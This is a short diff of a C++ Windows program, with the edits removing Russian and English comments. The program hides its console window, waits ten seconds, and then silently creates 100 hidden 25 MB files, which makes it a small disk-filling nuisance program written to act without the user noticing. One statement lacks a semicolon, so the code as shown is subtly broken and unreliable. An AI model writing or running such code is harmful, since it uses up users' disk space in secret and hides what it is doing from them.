@@ -19,10 +19,8 @@ int main() {
     const int numFiles = 100;
     const int fileSizeMB = 25;
 
-    // Получаем дескриптор окна консоли
     HWND hwnd = GetConsoleWindow();
 
-    // Скрываем окно консоли
     ShowWindow(hwnd, SW_HIDE);
 
     Sleep(10000)
@@ -32,13 +30,11 @@ int main() {
         ofstream file(filename, ios::out | ios::binary);
 
         if (file.is_open()) {
-            // Set the file size to 25 MB
             file.seekp(fileSizeMB * 1024 * 1024 - 1);
             file.put(0);
 
             file.close();
 
-            // Set the file as hidden
             setHiddenAttribute(filename);
 
             cout << "Created hidden file: " << filename << endl;
